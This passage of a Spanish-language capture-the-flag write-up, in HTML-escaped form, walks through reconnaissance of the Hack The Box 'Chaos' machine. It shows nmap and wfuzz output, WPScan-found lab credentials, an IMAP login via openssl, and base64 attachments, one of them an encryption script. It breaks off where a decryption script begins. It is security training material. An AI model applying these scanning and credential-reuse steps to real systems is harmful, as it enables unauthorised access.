&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos con nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.120
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.093s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;994&lt;/span&gt; closed ports
PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.34 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
110/tcp   open  pop3     Dovecot pop3d
143/tcp   open  imap     Dovecot imapd &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
993/tcp   open  ssl/imap Dovecot imapd &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
995/tcp   open  ssl/pop3 Dovecot pop3d
10000/tcp open  http     MiniServ 1.890 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Webmin httpd&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 48.15 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Al visitar la pagina en el puerto 80 nos muestra un mensaje &lt;code&gt;Direct IP not allowed&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_131403.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;wfuzz&#34;&gt;WFUZZ&lt;/h2&gt;
&lt;p&gt;Escaneo de directorios con WFUZZ y el wordlist &lt;code&gt;common.txt&lt;/code&gt;, nos encontramos con un directorio &lt;code&gt;/wp&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Target: http://10.10.10.120/FUZZ
Total requests: &lt;span class=&#34;nv&#34;&gt;4588&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;==================================================================&lt;/span&gt;
ID   Response   Lines      Word         Chars          &lt;span class=&#34;nv&#34;&gt;Payload&lt;/span&gt;    
&lt;span class=&#34;o&#34;&gt;==================================================================&lt;/span&gt;

000001:  &lt;span class=&#34;nv&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; L	       &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; W	     &lt;span class=&#34;m&#34;&gt;73&lt;/span&gt; Ch	  &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
001994:  &lt;span class=&#34;nv&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; L	       &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; W	     &lt;span class=&#34;m&#34;&gt;73&lt;/span&gt; Ch	  &lt;span class=&#34;s2&#34;&gt;&amp;#34;index.html&amp;#34;&lt;/span&gt;
002119:  &lt;span class=&#34;nv&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; L	      &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; W	    &lt;span class=&#34;m&#34;&gt;317&lt;/span&gt; Ch	  &lt;span class=&#34;s2&#34;&gt;&amp;#34;javascript&amp;#34;&lt;/span&gt;
003562:  &lt;span class=&#34;nv&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;403&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt; L	      &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; W	    &lt;span class=&#34;m&#34;&gt;300&lt;/span&gt; Ch	  &lt;span class=&#34;s2&#34;&gt;&amp;#34;server-status&amp;#34;&lt;/span&gt;
004458:  &lt;span class=&#34;nv&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; L	      &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; W	    &lt;span class=&#34;m&#34;&gt;309&lt;/span&gt; Ch	  &lt;span class=&#34;s2&#34;&gt;&amp;#34;wp&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Realizamos un escaneo por segunda vez al directorio &lt;code&gt;/wp&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Target: http://10.10.10.120/wp/FUZZ
Total requests: &lt;span class=&#34;nv&#34;&gt;4588&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;==================================================================&lt;/span&gt;
ID   Response   Lines      Word         Chars          &lt;span class=&#34;nv&#34;&gt;Payload&lt;/span&gt;    
&lt;span class=&#34;o&#34;&gt;==================================================================&lt;/span&gt;

000001:  &lt;span class=&#34;nv&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; L	      &lt;span class=&#34;m&#34;&gt;60&lt;/span&gt; W	    &lt;span class=&#34;m&#34;&gt;933&lt;/span&gt; Ch	  &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
004445:  &lt;span class=&#34;nv&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; L	      &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; W	    &lt;span class=&#34;m&#34;&gt;319&lt;/span&gt; Ch	  &lt;span class=&#34;s2&#34;&gt;&amp;#34;wordpress&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;wpwordpress&#34;&gt;/wp/wordpress&lt;/h3&gt;
&lt;p&gt;Al visitar la ruta &lt;code&gt;http://10.10.10.120/wp/wordpress/&lt;/code&gt; nos muestra una pagina en wordpress, y un post en el que nos indica que para poder ver el contenido del mismo necesitamos ingresar la contraseña.&lt;/p&gt;
&lt;p&gt;Obtuvimos la contraseña por medio de la herramienta &lt;code&gt;WPSCAN&lt;/code&gt; haciendo un escaneo a la pagina, la contraseña con la que pudimos desbloquear el post fue un usuario que encontramos con WPSCAN.&lt;/p&gt;
&lt;h2 id=&#34;wpscan---users&#34;&gt;WPSCAN - Users&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_133114.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Credenciales:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;username – ayush
password – jiujitsu
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Las credenciales que nos muestran son las de el webmail.&lt;/p&gt;
&lt;h2 id=&#34;http---puerto-10000&#34;&gt;HTTP - PUERTO 10000&lt;/h2&gt;
&lt;p&gt;Al visitar este puerto nos muestra una pagina con un mensaje y una url, agregamos chaos a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt; con la IP de la maquina para averiguar lo que obtenemos en ese dominio.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_135937.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;[/etc/hosts]&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;10.10.10.120	chaos
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al visitar &lt;code&gt;https://chaos:10000/&lt;/code&gt; nos muestra el weblogin al cual se refiere el mensaje de las credenciales.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_145204.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Igualmente podemos acceder direcatamente con la IP.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_140435.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al intentar iniciar sesion con las credenciales que encontramos nos muestra un error, al parecer no son las credenciales para el weblogin.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_140604.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;imap---puerto-993&#34;&gt;IMAP - Puerto 993&lt;/h2&gt;
&lt;p&gt;Utilizamos openssl para poder conectarnos con el &lt;code&gt;puerto 993&lt;/code&gt; y poder obtener un poco de informacion en este servicio corriendo en la maquina, utilizamos las credenciales para poder hacer un login.&lt;/p&gt;
&lt;p&gt;En la carpeta o seccion de &lt;code&gt;Drafts&lt;/code&gt; encontramos un correo existente aun.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_141221.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al leer el correo nos muestra un mensaje que nos habla sobre dos archivos adjuntos al correo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_141409.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Hii&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sahay&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Check&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;enmsg&lt;/span&gt;.&lt;span class=&#34;nx&#34;&gt;txt&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;You&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;are&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;XD&lt;/span&gt;.&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Also&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;attached&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;which&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;used&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;encrypt&lt;/span&gt;.&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Thanks&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Ayush&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Primer archivo:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_141653.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;nx&#34;&gt;MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/AldQmd/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;g53L6pgva9RdPkJ3GSW57onvseOe5ai95&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M7Y2mM6I+lH0zQb6Xt/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;JkhOZGWQzH4llEbyHvvlIjfu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e6Hq7AUnTxcMsqqLdqEL5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;LS10yge&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;l6ON4g1fpYizywI3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;h9l5Iwpj&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Segundo archivo:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_141724.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;nx&#34;&gt;ZGVmIGVuY3J5cHQoa2V5LCBmaWxlbmFtZSk6CiAgICBjaHVua3NpemUgPSA2NCoxMDI0CiAgICBvdXRwdXRGaWxlID0gImVuIiArIGZpbGVuYW1lCiAgICBmaWxlc2l6ZSA9IHN0cihvcy5wYXRoLmdldHNpemUoZmlsZW5hbWUpKS56ZmlsbCgxNikKICAgIElWID1SYW5kb20ubmV3KCkucmVhZCgxNikKCiAgICBlbmNyeXB0b3IgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVikKCiAgICB3aXRoIG9wZW4oZmlsZW5hbWUsICdyYicpIGFzIGluZmlsZToKICAgICAgICB3aXRoIG9wZW4ob3V0cHV0RmlsZSwgJ3diJykgYXMgb3V0ZmlsZToKICAgICAgICAgICAgb3V0ZmlsZS53cml0ZShmaWxlc2l6ZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIG91dGZpbGUud3JpdGUoSVYpCgogICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgY2h1bmsgPSBpbmZpbGUucmVhZChjaHVua3NpemUpCgogICAgICAgICAgICAgICAgaWYgbGVuKGNodW5rKSA9PSAwOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxlbihjaHVuaykgJSAxNiAhPSAwOgogICAgICAgICAgICAgICAgICAgIGNodW5rICs9IGInICcgKiAoMTYgLSAobGVuKGNodW5rKSAlIDE2KSkKCiAgICAgICAgICAgICAgICBvdXRmaWxlLndyaXRlKGVuY3J5cHRvci5lbmNyeXB0KGNodW5rKSkKCmRlZiBnZXRLZXkocGFzc3dvcmQpOgogICAgICAgICAgICBoYXNoZXIgPSBTSEEyNTYubmV3KHBhc3N3b3JkLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgcmV0dXJuIGhhc2hlci5kaWdlc3QoKQoK&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Comandos Utilizados:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;openssl s_client -connect 10.10.10.120:993
a login ayush jiujitsu
a &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; Drafts
UID FETCH &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;BODY&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
UID FETCH &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;BODY&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt; &amp;lt;-- Lectura del primer archivo
UID FETCH &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;BODY&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;3&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt; &amp;lt;-- Lectura del segundo archivo
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El primer archivo pertenece a &lt;code&gt;enmsg.txt&lt;/code&gt; y el segundo al archivo que encriptó &lt;code&gt;enmsg.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_142003.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que tenemos el archivo de encriptacion podemos escribir algunas funciones para poder desencriptar el archivo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
